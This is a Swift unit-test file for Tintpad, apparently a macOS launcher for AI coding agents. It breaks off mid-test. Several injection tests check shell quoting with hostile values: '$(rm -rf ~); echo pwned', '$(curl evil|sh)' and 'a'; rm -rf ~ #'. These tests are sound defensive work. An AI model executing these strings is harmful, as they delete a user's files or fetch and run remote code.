import XCTest
@testable import Tintpad

final class FrecencyTests: XCTestCase {
    func testDecayHalvesAfterOneHalfLife() {
        var repo = Repo(path: "/x", name: "x")
        let now = Date(timeIntervalSince1970: 1_000_000)
        repo.frecencyScore = 8
        repo.lastLaunchedAt = now
        let later = now.addingTimeInterval(86_400 * 10) // 10 days = one half-life
        let decayed = Frecency.decayedScore(repo, now: later, halfLifeDays: 10)
        XCTAssertEqual(decayed, 4, accuracy: 0.001)
    }

    func testEqualScoresBreakTieByRecencyThenName() {
        let now = Date(timeIntervalSince1970: 1_000_000)
        // Equal score (0, never launched) → sort by name.
        var c = Repo(path: "/c", name: "charlie")
        var a = Repo(path: "/a", name: "alpha")
        let ordered = Frecency.ordered([c, a], now: now, halfLifeDays: 30)
        XCTAssertEqual(ordered.map(\.name), ["alpha", "charlie"])
        // Same score but one launched more recently → it comes first.
        a.frecencyScore = 1; a.lastLaunchedAt = now.addingTimeInterval(-100)
        c.frecencyScore = 1; c.lastLaunchedAt = now.addingTimeInterval(-10)
        XCTAssertEqual(Frecency.ordered([a, c], now: now, halfLifeDays: 30).map(\.name), ["charlie", "alpha"])
    }

    // Guards the arrow-nav-jumping regression: the list order must not change as
    // time ticks (a non-transitive epsilon comparator made it reshuffle per render).
    func testOrderingStableAcrossTimeJitter() {
        let now = Date(timeIntervalSince1970: 2_000_000)
        var repos = ["alpha", "bravo", "charlie", "delta", "echo"].map { Repo(path: "/\($0)", name: $0) }
        repos[1].frecencyScore = 3; repos[1].lastLaunchedAt = now.addingTimeInterval(-3600)
        repos[3].frecencyScore = 3; repos[3].lastLaunchedAt = now.addingTimeInterval(-3600) // ties bravo
        let a = Frecency.ordered(repos, now: now, halfLifeDays: 30).map(\.name)
        let b = Frecency.ordered(repos, now: now.addingTimeInterval(1.5), halfLifeDays: 30).map(\.name)
        XCTAssertEqual(a, b, "frecency order must be stable as time advances")
    }

    // A future-dated anchor (clock rollback, restored backup) must decay to
    // at most the stored score, never amplify it.
    func testFutureDatedAnchorDoesNotInflate() {
        var repo = Repo(path: "/x", name: "x")
        let now = Date(timeIntervalSince1970: 1_000_000)
        repo.frecencyScore = 2
        repo.lastLaunchedAt = now.addingTimeInterval(86_400 * 30)   // 30 days ahead
        XCTAssertEqual(Frecency.decayedScore(repo, now: now, halfLifeDays: 10), 2, accuracy: 0.001)
    }

    func testRecordVisitIncrementsAndReanchors() {
        var repo = Repo(path: "/x", name: "x")
        let now = Date(timeIntervalSince1970: 2_000_000)
        Frecency.recordVisit(&repo, now: now, halfLifeDays: 30)
        XCTAssertEqual(repo.launchCount, 1)
        XCTAssertEqual(repo.frecencyScore, 1, accuracy: 0.001)
        XCTAssertEqual(repo.lastLaunchedAt, now)
        // Same-instant second visit accumulates to 2.
        Frecency.recordVisit(&repo, now: now, halfLifeDays: 30)
        XCTAssertEqual(repo.frecencyScore, 2, accuracy: 0.001)
    }
}

final class CommandTemplateTests: XCTestCase {
    private func ctx(mode: RunMode, prompt: String?) -> CommandTemplate.Context {
        CommandTemplate.Context(repo: Repo(path: "/Users/me/acme", name: "acme"),
                                mode: mode, prompt: prompt, branch: "main", remote: nil)
    }

    func testModeAndNameSubstitution() {
        let yolo = RunMode(name: "YOLO", flags: "--dangerously-skip-permissions", isDangerous: true, description: "")
        let out = CommandTemplate.preview("claude {mode}", context: ctx(mode: yolo, prompt: nil))
        XCTAssertEqual(out, "claude --dangerously-skip-permissions")
    }

    func testEmptyModeCollapsesSpaces() {
        let out = CommandTemplate.preview("claude {mode} {prompt}", context: ctx(mode: .defaultMode(), prompt: nil))
        XCTAssertEqual(out, "claude")
    }

    // The empty-slot cleanup must never rewrite spaces inside quoted values:
    // "/Users/me/my  repo" is a legal path and must survive verbatim.
    func testDoubleSpacesInsideQuotedValuesSurvive() {
        let repo = Repo(path: "/Users/me/my  repo", name: "my  repo")
        let c = CommandTemplate.Context(repo: repo, mode: .defaultMode(),
                                        prompt: "fix  this", branch: nil, remote: nil)
        let out = CommandTemplate.preview("cd {repoPath} && claude {mode} {prompt}", context: c)
        XCTAssertEqual(out, "cd '/Users/me/my  repo' && claude 'fix  this'")
    }

    func testPromptIsQuoted() {
        let out = CommandTemplate.preview("claude {prompt}", context: ctx(mode: .defaultMode(), prompt: "fix bug"))
        XCTAssertEqual(out, "claude 'fix bug'")
    }

    func testRepoNameAndPathQuoted() {
        let out = CommandTemplate.preview("cd {repoPath} # {repoName}", context: ctx(mode: .defaultMode(), prompt: nil))
        XCTAssertEqual(out, "cd '/Users/me/acme' # 'acme'")
    }

    // S1: an adversarial repo/branch name cannot escape the single-quoted argument.
    func testInjectionViaRepoNameNeutralized() {
        var repo = Repo(path: "/x", name: "$(rm -rf ~); echo pwned")
        let c = CommandTemplate.Context(repo: repo, mode: .defaultMode(), prompt: nil, branch: nil, remote: nil)
        let out = CommandTemplate.preview("claude {repoName}", context: c)
        XCTAssertEqual(out, "claude '$(rm -rf ~); echo pwned'")
        XCTAssertFalse(out.contains("') ") || out.contains("';"))  // no quote-break
        _ = repo
    }

    func testSingleQuoteInValueEscaped() {
        let c = CommandTemplate.Context(repo: Repo(path: "/x", name: "x"),
                                        mode: .defaultMode(), prompt: "it's fine", branch: nil, remote: nil)
        let out = CommandTemplate.preview("claude {prompt}", context: c)
        XCTAssertEqual(out, "claude 'it'\\''s fine'")
    }

    // S2: newlines/control chars are stripped so they can't submit early or break AppleScript.
    func testNewlinesStrippedFromPrompt() {
        let c = CommandTemplate.Context(repo: Repo(path: "/x", name: "x"),
                                        mode: .defaultMode(), prompt: "line1\nrm -rf ~\ttab", branch: nil, remote: nil)
        let out = CommandTemplate.preview("claude {prompt}", context: c)
        XCTAssertFalse(out.contains("\n"))
        XCTAssertFalse(out.contains("\t"))
        XCTAssertEqual(out, "claude 'line1 rm -rf ~ tab'")
    }

    // S2: a .git/HEAD or .git/config with adversarial content flows into {branch}/{remote};
    // both must be single-quoted just like repo path/name.
    func testBranchAndRemoteQuoted() {
        let c = CommandTemplate.Context(
            repo: Repo(path: "/x", name: "x"), mode: .defaultMode(), prompt: nil,
            branch: "a'; rm -rf ~ #", remote: "$(curl evil|sh)", worktreePath: nil)
        let out = CommandTemplate.preview("claude --branch {branch} --remote {remote}", context: c)
        // The injected `'` is escaped as '\'' so the rm/curl payloads stay inside single quotes.
        XCTAssertEqual(out, "claude --branch 'a'\\''; rm -rf ~ #' --remote '$(curl evil|sh)'")
    }
}

// S2: the AppleScript escaping layer (iTerm2 / Terminal.app `do script "…"`) was untested.
final class AppleScriptEscapeTests: XCTestCase {
    func testDoubleQuoteEscaped() {
        XCTAssertEqual(appleScriptEscape("say \"hi\""), "say \\\"hi\\\"")
    }

    func testBackslashEscapedBeforeQuote() {
        // A backslash-then-quote must become \\ then \" — not \\" (which would be backslash + literal quote).
        XCTAssertEqual(appleScriptEscape("a\\\"b"), "a\\\\\\\"b")
    }

    func testNewlineAndCarriageReturnCollapsed() {
        XCTAssertEqual(appleScriptEscape("a\nb\rc"), "a b c")
        XCTAssertFalse(appleScriptEscape("x\ny").contains("\n"))
    }

    // End-to-end: an adversarial branch survives shell single-quoting, then the assembled
    // `cd 'wd' && cmd` is AppleScript-escaped with no unescaped double quote left to break the literal.
    func testEndToEndShellThenAppleScriptNoUnescapedQuote() {
        let c = CommandTemplate.Context(
            repo: Repo(path: "/Users/me/acme", name: "acme"), mode: .defaultMode(),
            prompt: "say \"done\"", branch: "a\"b", remote: nil, worktreePath: nil)
        let command = CommandTemplate.preview("claude --branch {branch} {prompt}", context: c)
        let assembled = "cd '/Users/me/acme' && \(command)"
        let escaped = appleScriptEscape(assembled)
        // Every literal double quote in the assembled command must be backslash-escaped.
        var prev: Character = " "
        for ch in escaped {
            if ch == "\"" { XCTAssertEqual(prev, "\\", "unescaped double quote in AppleScript literal: \(escaped)") }
            prev = ch
        }
    }
}

final class LaunchDefaultsTests: XCTestCase {
    private let safe = RunMode(name: "Safe", flags: "", isDangerous: false, description: "")
    private let def = RunMode.defaultMode()
    private let yolo = RunMode(name: "YOLO", flags: "--yolo", isDangerous: true, description: "")

    private func makeAgent(_ name: String) -> Agent {
        Agent(name: name, commandTemplate: "\(name) {mode}", acceptsPrompt: true, tintHex: nil,
              symbol: "terminal", modes: [safe, def, yolo], defaultModeID: def.id)
    }

    func testPinnedModeWinsOverLastUsedAndAgentDefault() {
        let agent = makeAgent("claude")
        var repo = Repo(path: "/x", name: "x")
        repo.defaultModeID = yolo.id
        repo.lastModeID = safe.id
        XCTAssertEqual(LaunchDefaults.mode(for: repo, agent: agent).id, yolo.id)
    }

    func testLastUsedModeWinsOverAgentDefault() {
        let agent = makeAgent("claude")
        var repo = Repo(path: "/x", name: "x")
        repo.lastModeID = yolo.id
        XCTAssertEqual(LaunchDefaults.mode(for: repo, agent: agent).id, yolo.id)
    }

    func testStaleLastModeFromAnotherAgentFallsThrough() {
        let agent = makeAgent("claude")
        var repo = Repo(path: "/x", name: "x")
        repo.lastModeID = UUID()   // a mode that belongs to no current agent
        XCTAssertEqual(LaunchDefaults.mode(for: repo, agent: agent).id, def.id)
    }

    func testOverrideBeatsEverything() {
        let agent = makeAgent("claude")
        var repo = Repo(path: "/x", name: "x")
        repo.defaultModeID = yolo.id
        repo.lastModeID = yolo.id
        XCTAssertEqual(LaunchDefaults.mode(for: repo, agent: agent, overrideID: safe.id).id, safe.id)
    }

    func testAgentPrecedencePinnedThenLastUsedThenFirst() {
        let claude = makeAgent("claude")
        let codex = makeAgent("codex")
        var repo = Repo(path: "/x", name: "x")
        XCTAssertEqual(LaunchDefaults.agent(for: repo, agents: [claude, codex])?.id, claude.id)
        repo.lastAgentID = codex.id
        XCTAssertEqual(LaunchDefaults.agent(for: repo, agents: [claude, codex])?.id, codex.id)
        repo.defaultAgentID = claude.id
        XCTAssertEqual(LaunchDefaults.agent(for: repo, agents: [claude, codex])?.id, claude.id)
    }

    func testRemovedLastAgentFallsBackToFirst() {
        let claude = makeAgent("claude")
        var repo = Repo(path: "/x", name: "x")
        repo.lastAgentID = UUID()   // agent since deleted
        XCTAssertEqual(LaunchDefaults.agent(for: repo, agents: [claude])?.id, claude.id)
    }
}

final class LaunchResolutionTests: XCTestCase {
    private func agent(_ template: String) -> Agent {
        Agent(name: "T", commandTemplate: template, acceptsPrompt: true, tintHex: nil,
              symbol: "terminal", modes: [.defaultMode()], defaultModeID: nil)
    }

    func testMakeLaunchResolvesCommandAndWorkingDir() throws {
        // A "/"-prefixed binary is trusted as-is, so resolution is deterministic.
        let mode = RunMode(name: "YOLO", flags: "--go", isDangerous: true, description: "")
        var s = Settings(); s.openInNewTab = false
        let launch = try LaunchService.makeLaunch(
            repo: Repo(path: "/tmp/acme", name: "acme"), agent: agent("/bin/echo {mode} {prompt}"),
            mode: mode, prompt: "fix it", worktreePath: nil, settings: s)
        XCTAssertEqual(launch.workingDirectory, "/tmp/acme")
        XCTAssertEqual(launch.command,
                       CommandTemplate.inFreshSession("/bin/echo --go 'fix it'"))
        XCTAssertFalse(launch.openInTab)
    }

    func testMakeLaunchHonorsTabSettingAndWorktree() throws {
        var s = Settings(); s.openInNewTab = true
        let launch = try LaunchService.makeLaunch(
            repo: Repo(path: "/tmp/acme", name: "acme"), agent: agent("/bin/echo"),
            mode: .defaultMode(), prompt: nil, worktreePath: "/tmp/wt/feature", settings: s)
        XCTAssertTrue(launch.openInTab)
        XCTAssertEqual(launch.workingDirectory, "/tmp/wt/feature")
        XCTAssertEqual(launch.command, CommandTemplate.inFreshSession("/bin/echo"))
    }
}

final class FreshSessionTests: XCTestCase {
    // Hardcoded on purpose: changing the marker list should be a conscious
    // decision, not a refactor side effect.
    func testFreshSessionUnsetsExactlyTheSessionMarkers() {
        XCTAssertEqual(
            CommandTemplate.inFreshSession("/bin/echo hi"),
            "env -u CLAUDECODE -u CLAUDE_CODE_CHILD_SESSION -u CLAUDE_CODE_SESSION_ID"
                + " -u CLAUDE_PID -u CLAUDE_CODE_ENTRYPOINT /bin/echo hi")
    }

    func testScrubDropsMarkersAndKeepsDeliberateConfig() {
        let env = ShellEnvironment.scrubSessionMarkers([
            "CLAUDECODE": "1",
            "CLAUDE_CODE_CHILD_SESSION": "1",
            "ANTHROPIC_API_KEY": "sk-x",
            "CLAUDE_CONFIG_DIR": "/x",
            "PATH": "/usr/bin",
        ])
        XCTAssertNil(env["CLAUDECODE"])
        XCTAssertNil(env["CLAUDE_CODE_CHILD_SESSION"])
        XCTAssertEqual(env["ANTHROPIC_API_KEY"], "sk-x")
        XCTAssertEqual(env["CLAUDE_CONFIG_DIR"], "/x")
        XCTAssertEqual(env["PATH"], "/usr/bin")
    }

    // The prefix must survive the adapters' `cd … && cmd` chains as one simple
    // command: the marker is really unset, and a failed cd still short-circuits.
    func testFreshSessionCommandBehavesInShellChain() throws {
        let probe = CommandTemplate.inFreshSession("printenv CLAUDE_CODE_CHILD_SESSION")
        let dirty = ["CLAUDE_CODE_CHILD_SESSION": "1", "PATH": "/usr/bin:/bin"]
        let unset = try ProcessRunner.run(
            "/bin/sh", arguments: ["-c", "cd /tmp && \(probe)"],
            environment: dirty, timeout: 10)
        XCTAssertEqual(unset.stdout, "")   // printenv prints nothing when unset
        XCTAssertNotEqual(unset.status, 0)

        let skipped = try ProcessRunner.run(
            "/bin/sh", arguments: ["-c", "cd /nonexistent-tintpad && \(CommandTemplate.inFreshSession("echo ran"))"],
            environment: dirty, timeout: 10)
        XCTAssertFalse(skipped.stdout.contains("ran"))
    }
}

final class GhosttyHandoffTests: XCTestCase {
    func testColdLaunchTypesIntoTheInitialWindow() {
        // A cold `activate` launches Ghostty, which opens its own window; an
        // unconditional ⌘N/⌘T on top of it is the two-window bug. ⌘N survives
        // only as the guarded fallback for `initial-window = false` configs.
        let cold = GhosttyAdapter.handoffScript(command: "cd /x && claude",
                                                openInTab: true, wasRunning: false)
        XCTAssertFalse(cold.contains("keystroke \"t\" using command down"))
        XCTAssertTrue(cold.contains(
            "if (count of windows of process \"Ghostty\") is 0 then keystroke \"n\" using command down"))
        XCTAssertTrue(cold.contains("keystroke \"cd /x && claude\""))
    }

    func testWarmLaunchOpensWindowOrTab() {
        let window = GhosttyAdapter.handoffScript(command: "cd /x && claude",
                                                  openInTab: false, wasRunning: true)
        XCTAssertTrue(window.contains("keystroke \"n\" using command down"))
        let tab = GhosttyAdapter.handoffScript(command: "cd /x && claude",
                                               openInTab: true, wasRunning: true)
        XCTAssertTrue(tab.contains("keystroke \"t\" using command down"))
        XCTAssertTrue(tab.contains("keystroke \"cd /x && claude\""))
    }
}

final class ErrorMessageTests: XCTestCase {
    func testFriendlyLocalizedDescriptions() {
        XCTAssertEqual((TerminalLaunchError.notInstalled as LocalizedError).errorDescription,
                       "That terminal isn't installed.")
        // A permission error keeps its short summary and full remedy joined,
        // and carries the pane so the palette can open it on ⏎.
        let permission = TerminalLaunchError.permissionNeeded(
            summary: "Ghostty needs Accessibility",
            remedy: "Grant Tintpad in System Settings.",
            pane: .accessibility)
        XCTAssertEqual((permission as LocalizedError).errorDescription,
                       "Ghostty needs Accessibility. Grant Tintpad in System Settings.")
        if case .permissionNeeded(_, _, let pane) = permission {
            XCTAssertEqual(pane, .accessibility)
        } else {
            XCTFail("pattern match lost the pane")
        }
        let resolve = CommandTemplate.ResolveError.binaryNotFound("claude")
        XCTAssertEqual((resolve as LocalizedError).errorDescription,
                       "“claude” isn’t on your PATH, check it’s installed, then Re-scan.")
        // No raw "error N" Swift boilerplate leaks through.
        XCTAssertFalse((resolve as Error).localizedDescription.contains("error "))
    }
}

final class LicenseTests: XCTestCase {
    // The sample Pro key signed by the embedded public key (see secrets/).
    private let validKey = "eyJlbWFpbCI6ImVyaWtAc29ya2lsYS5jb20iLCJwbGFuIjoicHJvIiwiaWF0IjoxNzUwMDAwMDAwfQ==.HqALR7nuRgB6AeUq7daHFd33+ESLZn2qdMbMaKk1FwoIAACRxgs5rSXdkG2A2bxPXGJ4g1jRCNrQJ2LS08DeCQ=="

    func testValidKeyAccepted() {
        let info = LicenseManager.verify(validKey)
        XCTAssertEqual(info?.plan, "pro")
        XCTAssertEqual(info?.email, "erik@sorkila.com")
    }

    func testNilAndGarbageRejected() {
        XCTAssertNil(LicenseManager.verify(nil))
        XCTAssertNil(LicenseManager.verify(""))
        XCTAssertNil(LicenseManager.verify("not-a-key"))
        XCTAssertNil(LicenseManager.verify("a.b"))
    }

    func testTamperedSignatureRejected() {
        var bad = validKey
        let dot = bad.firstIndex(of: ".")!
        let after = bad.index(after: dot)
        bad.replaceSubrange(after...after, with: bad[after] == "H" ? "I" : "H")
        XCTAssertNil(LicenseManager.verify(bad))
    }
}

final class GitInfoTests: XCTestCase {
    func testParsesBranchAndRemote() throws {
        let dir = NSTemporaryDirectory() + "tintpad-gittest-\(UUID().uuidString)"
        let git = dir + "/.git"
        try FileManager.default.createDirectory(atPath: git, withIntermediateDirectories: true)
        try "ref: refs/heads/feature/x\n".write(toFile: git + "/HEAD", atomically: true, encoding: .utf8)
        try """
        [core]
            bare = false
        [remote "origin"]
            url = git@github.com:me/acme.git
        """.write(toFile: git + "/config", atomically: true, encoding: .utf8)

        let meta = GitInfo.read(at: dir)
        XCTAssertEqual(meta.branch, "x")  // last path component of refs/heads/feature/x
        XCTAssertEqual(meta.remoteURL, "git@github.com:me/acme.git")
        try? FileManager.default.removeItem(atPath: dir)
    }
}

final class GitStatusTests: XCTestCase {
    private func sh(_ args: [String], cwd: String) {
        let p = Process()
        p.executableURL = URL(fileURLWithPath: "/usr/bin/git")
        p.arguments = args
        p.currentDirectoryURL = URL(fileURLWithPath: cwd)
        try? p.run(); p.waitUntilExit()
    }

    func testCleanDirtyAndNonRepo() throws {
        try XCTSkipUnless(FileManager.default.isExecutableFile(atPath: "/usr/bin/git"))
        let dir = NSTemporaryDirectory() + "tintpad-dirty-\(UUID().uuidString)"
        try FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(atPath: dir) }

        // Not a repo yet → unknown, never a guess.
        XCTAssertNil(GitStatus.isDirty(at: dir))

        sh(["init", "-q"], cwd: dir)
        sh(["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "init"], cwd: dir)
        XCTAssertEqual(GitStatus.isDirty(at: dir), false)

        // An untracked file counts as dirty — that is what the working tree shows.
        FileManager.default.createFile(atPath: dir + "/new.txt", contents: Data("x".utf8))
        XCTAssertEqual(GitStatus.isDirty(at: dir), true)
    }
}

final class RepoDiscoveryTests: XCTestCase {
    func testFindsGitRepos() throws {
        let root = NSTemporaryDirectory() + "tintpad-disc-\(UUID().uuidString)"
        let repo = root + "/myrepo"
        try FileManager.default.createDirectory(atPath: repo + "/.git", withIntermediateDirectories: true)
        try FileManager.default.createDirectory(atPath: root + "/not-a-repo", withIntermediateDirectories: true)

        let found = RepoDiscovery.scan(roots: [root])
        XCTAssertTrue(found.contains { $0.hasSuffix("/myrepo") })
        XCTAssertFalse(found.contains { $0.hasSuffix("/not-a-repo") })
        try? FileManager.default.removeItem(atPath: root)
    }
}

final class MonogramTests: XCTestCase {
    func testUnambiguousNamesGetOneLetter() {
        XCTAssertEqual(Monogram.assign(["Gemini", "Aider", "Codex"]), ["G", "A", "C"])
    }

    func testCollidingNamesGrowAndNonCollidingStaySingle() {
        // Only the C's collide; Gemini keeps its clean single letter.
        let out = Monogram.assign(["Claude Code", "Codex", "Gemini"])
        XCTAssertEqual(out[2], "G")
        XCTAssertNotEqual(out[0], out[1])
        XCTAssertEqual(Set(out).count, 3)
    }

    func testSingleWordCollisionUsesFirstTwoLetters() {
        let out = Monogram.assign(["Codex", "Coder"])
        XCTAssertEqual(Set(out).count, 2, "shared 'Co' prefix must still resolve")
    }

    func testAssignmentIsStableAndOrderPreserving() {
        let names = ["Claude Code", "Codex", "Cursor"]
        XCTAssertEqual(Monogram.assign(names), Monogram.assign(names))
        XCTAssertEqual(Monogram.assign(names).count, names.count)
    }

    func testLeadingNonLettersAndEmptyNames() {
        XCTAssertEqual(Monogram.assign(["  opencode"]), ["O"])
        XCTAssertEqual(Monogram.assign(["!!!"]), ["?"])
    }

    func testOfMatchesAssignForTheSameSet() {
        let names = ["Claude Code", "Codex", "Gemini"]
        let all = Monogram.assign(names)
        for (i, n) in names.enumerated() {
            XCTAssertEqual(Monogram.of(n, in: names), all[i])
        }
    }
}

final class ModeVocabularyTests: XCTestCase {
    // Old stores carried invented names (Safe/YOLO). Migration renames only
    // untouched seeds (name AND flags match), preserves IDs, and never
    // clobbers user-customized vocabulary.
    func testSeedModesMigrateToAgentVocabulary() {
        var claude = AgentSeed.claudeCode
        claude.modes = [
            RunMode(name: "Safe", flags: "", isDangerous: false, description: ""),
            RunMode(name: "YOLO", flags: "--dangerously-skip-permissions", isDangerous: true, description: ""),
        ]
        var codex = AgentSeed.codex
        codex.modes = [
            RunMode(name: "Safe", flags: "--ask-for-approval untrusted", isDangerous: false, description: ""),
            RunMode(name: "YOLO", flags: "--dangerously-bypass-approvals-and-sandbox", isDangerous: true, description: ""),
        ]
        let oldID = claude.modes[1].id
        let migrated = AgentSeed.migrateModeNames([claude, codex])
        XCTAssertEqual(migrated[0].modes[1].name, "Skip permissions")
        XCTAssertEqual(migrated[0].modes[1].id, oldID, "IDs survive, so pins and memory survive")
        XCTAssertEqual(migrated[0].modes[0].name, "Safe", "no rename rule matched — untouched")
        XCTAssertEqual(migrated[1].modes[0].name, "Untrusted")
        XCTAssertEqual(migrated[1].modes[1].name, "Full access")
    }

    func testCustomizedNamesAreNeverClobbered() {
        var agent = AgentSeed.claudeCode
        agent.modes = [RunMode(name: "YOLO", flags: "--my-custom-flag", isDangerous: true, description: "")]
        XCTAssertEqual(AgentSeed.migrateModeNames([agent])[0].modes[0].name, "YOLO")
    }
}

final class RepoTintTests: XCTestCase {
    func testHueIsDeterministicAndInRange() {
        for name in ["Tintpad", "Kuta", "Velm", "SB3K", "The Prototype Lab"] {
            let h = RepoTint.hue(for: name)
            XCTAssertEqual(h, RepoTint.hue(for: name), "hue must be stable")
            XCTAssertGreaterThanOrEqual(h, 20)
            XCTAssertLessThan(h, 340, "danger-red band is reserved")
        }
    }

    func testCaseInsensitive() {
        XCTAssertEqual(RepoTint.hue(for: "Kuta"), RepoTint.hue(for: "kuta"))
    }

    func testShortNames() {
        XCTAssertEqual(RepoTint.shortName(for: "Kuta"), "KUTA")       // fits whole
        XCTAssertEqual(RepoTint.shortName(for: "SB3K"), "SB3K")
        XCTAssertEqual(RepoTint.shortName(for: "Tintpad"), "TIN")     // prefix
        XCTAssertEqual(RepoTint.shortName(for: "The Prototype Lab"), "TPL")  // initials
        XCTAssertEqual(RepoTint.shortName(for: "my-cool-repo"), "MCR")
        XCTAssertEqual(RepoTint.shortName(for: ""), "?")
    }
}

final class KeyPolicyTests: XCTestCase {
    func testTabIsOursWhenNoAssistiveTechIsActive() {
        XCTAssertFalse(KeyPolicy.tabShouldTraverse(voiceOver: false, fullKeyboardAccess: false),
                       "⇥ should still cycle agents for ordinary keyboard use")
    }

    func testVoiceOverReclaimsTab() {
        XCTAssertTrue(KeyPolicy.tabShouldTraverse(voiceOver: true, fullKeyboardAccess: false))
    }

    func testFullKeyboardAccessReclaimsTab() {
        XCTAssertTrue(KeyPolicy.tabShouldTraverse(voiceOver: false, fullKeyboardAccess: true))
    }
}

/// The live contract. The MODE chip previews the held modifier, so it must
/// state exactly the mode ⏎ resolves with the same modifiers.
final class ContractPreviewTests: XCTestCase {
    private let safe = RunMode(name: "Untrusted", flags: "--ask-for-approval untrusted",
                               isDangerous: false, description: "")
    private let def = RunMode.defaultMode()
    private let yolo = RunMode(name: "Skip permissions", flags: "--yolo", isDangerous: true,
                               description: "")

    private func agent(modes: [RunMode]? = nil) -> Agent {
        Agent(name: "Codex", commandTemplate: "codex {mode}", acceptsPrompt: true, tintHex: nil,
              symbol: "terminal", modes: modes ?? [def, safe, yolo], defaultModeID: def.id)
    }

    private func chips(_ held: ContractPreview.Held, editor: String? = "Zed",
                       prompt: PromptTemplate? = nil, modes: [RunMode]? = nil) -> [ContractPreview.Chip] {
        ContractPreview.chips(agent: agent(modes: modes), restingMode: def, prompt: prompt,
                              editorName: editor, held: held)
    }

    // The hug measures the resting contract, so a held modifier can reshape
    // the chips but never the drop's width.
    func testHugBaselineIgnoresHeldModifiers() {
        let resting = chips(.none).map(\.label)
        XCTAssertEqual(resting, ["Codex", "Default"])
        XCTAssertNotEqual(chips(ContractPreview.Held(option: true, commandHeldLong: true)).map(\.label), resting)
        XCTAssertEqual(ContractPreview.Held.none, ContractPreview.Held())
    }

    func testAtRestTheContractIsAgentThenMode() {
        let c = chips(.none)
        XCTAssertEqual(c.map(\.kind), [.agent, .mode])
        XCTAssertEqual(c[1].label, "Default")
        XCTAssertFalse(c[1].danger)
    }

    func testPromptLeadsTheContract() {
        let c = chips(.none, prompt: PromptTemplate(title: "Review", text: "review"))
        XCTAssertEqual(c.map(\.kind), [.prompt, .agent, .mode])
        XCTAssertEqual(c[0].label, "Review")
    }

    func testOptionPreviewsDangerousModeInRed() {
        let mode = chips(ContractPreview.Held(option: true)).first { $0.kind == .mode }
        XCTAssertEqual(mode?.label, "Skip permissions")
        XCTAssertEqual(mode?.danger, true)
    }

    func testOptionOnAnAgentWithNoDangerousModeKeepsTheRestingMode() {
        let mode = chips(ContractPreview.Held(option: true), modes: [def, safe]).first { $0.kind == .mode }
        XCTAssertEqual(mode?.label, "Default")
        XCTAssertEqual(mode?.danger, false)
    }

    func testShiftPreviewsSafestMode() {
        // The first non-dangerous mode in the agent's order, not "Default" by name.
        let mode = chips(ContractPreview.Held(shift: true), modes: [safe, yolo, def])
            .first { $0.kind == .mode }
        XCTAssertEqual(mode?.label, "Untrusted")
    }

    func testControlAppendsHeadless() {
        let c = chips(ContractPreview.Held(control: true))
        XCTAssertEqual(c.map(\.kind), [.agent, .mode, .run])
        XCTAssertEqual(c.last?.label, "Headless")
        XCTAssertEqual(c.last?.tag, "run")
    }

    func testCommandHeldLongAppendsOpenInOnlyWithAnEditor() {
        let short = ContractPreview.Held(command: true)
        XCTAssertEqual(chips(short).map(\.kind), [.agent, .mode])
        let long = ContractPreview.Held(command: true, commandHeldLong: true)
        XCTAssertEqual(chips(long).map(\.kind), [.agent, .mode, .openIn])
        XCTAssertEqual(chips(long).last?.label, "Zed")
        XCTAssertEqual(chips(long).last?.tag, "open in")
        XCTAssertEqual(chips(long, editor: nil).map(\.kind), [.agent, .mode])
    }

    // ⌘⏎ opens the editor and ⌘1–⌘9 launch at rest, so while ⌘ is down no
    // other modifier may paint a mode or a headless run that ⏎ won't do.
    func testCommandSuspendsTheOtherModifiers() {
        let c = chips(ContractPreview.Held(option: true, control: true, command: true))
        XCTAssertEqual(c.map(\.kind), [.agent, .mode])
        XCTAssertEqual(c[1].label, "Default")
        XCTAssertFalse(c[1].danger)
    }

    // A summon seeds from the physical keys, and the hotkey chord (⌥⌘Space)
    // is still down. It must show neither OPEN IN nor a red MODE.
    func testSummonChordSeedsWithoutOpenInOrDanger() {
        let c = chips(ContractPreview.Held(flags: [.option, .command], commandHeldLong: false))
        XCTAssertEqual(c.map(\.kind), [.agent, .mode])
        XCTAssertEqual(c[1].label, "Default")
        XCTAssertFalse(c[1].danger)
    }

    // Held past the beat, every chip names the key that works it. At rest,
    // and on a quick ⌘ chord, none does, which is what keeps the hug (it
    // measures `Held.none`) from widening for a hint.
    func testCommandHeldRevealsKeys() {
        let prompt = PromptTemplate(title: "Review", text: "review")
        let long = chips(ContractPreview.Held(command: true, commandHeldLong: true), prompt: prompt)
        XCTAssertEqual(long.map(\.kind), [.prompt, .agent, .mode, .openIn])
        XCTAssertEqual(long.map(\.key), ["P", "⇥", "⇧⇥", "⏎"])
        for held in [ContractPreview.Held.none, ContractPreview.Held(command: true),
                     ContractPreview.Held(option: true), ContractPreview.Held(control: true)] {
            XCTAssertTrue(chips(held, prompt: prompt).allSatisfy { $0.key == nil }, "\(held)")
        }
    }

    func testHeldFromFlagsNeverHoldsLongWithoutCommand() {
        let held = ContractPreview.Held(flags: [.option], commandHeldLong: true)
        XCTAssertEqual(held, ContractPreview.Held(option: true))
    }

    func testPreviewAgreesWithResolveMode() {
        for modes in [[def, safe, yolo], [yolo, safe], [def, safe], [yolo]] {
            let a = agent(modes: modes)
            let resting = modes[0]
            for option in [false, true] {
                for shift in [false, true] {
                    for control in [false, true] {
                        let resolved = ModeResolution.mode(for: a, resting: resting,
                                                           option: option, shift: shift)
                        let held = ContractPreview.Held(option: option, shift: shift, control: control)
                        let chip = ContractPreview.chips(agent: a, restingMode: resting, prompt: nil,
                                                         editorName: nil, held: held)
                            .first { $0.kind == .mode }
                        XCTAssertEqual(chip?.label, resolved.name)
                        XCTAssertEqual(chip?.danger, resolved.isDangerous)
                        XCTAssertEqual(ContractPreview.mode(agent: a, restingMode: resting, held: held).id,
                                       resolved.id)
                    }
                }
            }
        }
    }
}

/// The double-launch rules. A launch is deferred a beat so "Opening …" can be
/// painted, and a Return queued in that beat, during the close gesture, or on
/// a Warp note must never start a second launch.
final class LaunchGateTests: XCTestCase {
    func testReturnIgnoredWhileInFlight() {
        XCTAssertEqual(LaunchGate.returnDisposition(inFlight: true, dismissing: false, noteShown: false),
                       .ignore)
    }

    func testReturnIgnoredWhileDismissing() {
        XCTAssertEqual(LaunchGate.returnDisposition(inFlight: false, dismissing: true, noteShown: false),
                       .ignore)
    }

    func testReturnClosesOnNoteWithoutLaunching() {
        XCTAssertEqual(LaunchGate.returnDisposition(inFlight: false, dismissing: false, noteShown: true),
                       .closeOnly)
    }

    // A launch underway outranks a stale note: nothing closes under it.
    func testInFlightOutranksNote() {
